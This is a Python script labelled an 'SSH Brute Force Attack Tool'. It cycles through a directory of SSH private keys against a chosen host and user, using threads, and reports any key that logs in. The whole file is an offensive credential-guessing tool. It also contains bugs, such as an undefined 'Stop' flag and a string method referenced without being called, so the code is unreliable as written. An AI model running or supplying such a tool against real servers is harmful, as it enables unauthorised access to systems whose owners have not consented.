import argparse
import threading
from threading import BoundedSemaphore
import time
from pexpect import pxssh
import sys
import os

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0

def connect(host, user, keyfile, release=True):
    global Stop
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, '', ssh_key=keyfile, auto_prompt_reset=False)
        print(f'[+] Successful connection with key: {keyfile}')
        Stop = True
    except pxssh.ExceptionPxssh as e:
        if 'permission denied' in str(e).lower():
            pass #key failed, return and try next one
        elif 'connection closed' in str(e).lower:
            Fails += 1
            if Fails >5:
                print("[!] Exiting: too many connection failures")
                Stop = True
                return
            
    finally: 
        if release:
            connection_lock.release()


def main(host, user, keydir):
    global connection_lock
    global Stop

    # Load the password list
    try:
        keyfiles = [os.path.join(keydir, f) for f in os.listdir(keydir) if os.path.isfile(os.path.join(keydir, f))]
    except Exception as e:
        print(f"[-] Error opening key directory: {e}")
        return

    for keyfile in keyfiles:
        if Stop:
            print("[*] Exiting: Key Found")
            exit(0)
        
        connection_lock.acquire()
        print(f"[-] Testing key: {keyfile}")
        t = threading.Thread(target=connect, args=(host, user, keyfile))
        t.start()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='SSH Brute Force Attack Tool')
    parser.add_argument('-H', '--host', type=str, help='Hostname or IP Address')
    parser.add_argument('-u', '--user', type=str, help='Username for SSH')
    parser.add_argument('-d', '--keydir', type=str, help='Directory containing SSH keys for brute force attack')
    args = parser.parse_args()

    main(args.host, args.user, args.keydir)
